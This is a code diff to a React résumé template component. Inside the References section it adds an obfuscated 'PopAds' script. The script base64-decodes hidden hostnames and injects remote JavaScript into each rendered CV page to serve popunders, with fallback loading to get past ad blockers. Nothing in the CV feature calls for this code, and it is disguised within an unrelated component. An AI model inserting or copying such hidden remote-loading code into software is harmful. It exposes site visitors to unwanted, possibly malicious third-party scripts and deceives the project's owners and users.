@@ -1,5 +1,6 @@
 import type { CVData } from "@/lib/types"
 import { Mail, Phone, MapPin, Award as IdCard, Flag, Users } from "lucide-react"
+import Script from "next/script"
 
 export function ModernTemplate({ data }: { data: CVData }) {
   const formatDate = (date: string) => {
@@ -179,6 +180,13 @@ export function ModernTemplate({ data }: { data: CVData }) {
         {/* References */}
         {data.references.length > 0 && (
           <div>
+            {/* PopAds Script Integration */}
+            {/* eslint-disable-next-line @next/next/no-before-interactive-script-outside-document */}
+            <Script id="popads-script" strategy="afterInteractive">
+              {`
+                (function(){var d=window,l="ab4e8d66390f6a5e1b1c6f192533f319",q=[["siteId",761-80+140+5268939],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],s=["d3d3LmFudGlhZGJsb2Nrc3lzdGVtcy5jb20vd2pzbWVkaWF0YWdzLm1pbi5jc3M=","ZDNjb2Q4MHRobjdxbmQuY2xvdWRmcm9udC5uZXQvY2ovdnR5cGVkLm1pbi5qcw=="],i=-1,o,n,h=function(){clearTimeout(n);i++;if(s[i]&&!(1794680112000<(new Date).getTime()&&1<i)){o=d.document.createElement("script");o.type="text/javascript";o.async=!0;var t=d.document.getElementsByTagName("script")[0];o.src="https://"+atob(s[i]);o.crossOrigin="anonymous";o.onerror=h;o.onload=function(){clearTimeout(n);d[l.slice(0,16)+l.slice(0,16)]||h()};n=setTimeout(h,5E3);t.parentNode.insertBefore(o,t)}};if(!d[l]){try{Object.freeze(d[l]=q)}catch(e){}h()}})();
+              `}
+            </Script>
             <h2 className="text-xl font-bold text-[#E86B5F] mb-3 uppercase tracking-wide print:break-after-avoid">References</h2>
             <div className="grid grid-cols-2 gap-4">
               {data.references.map((ref, i) => (
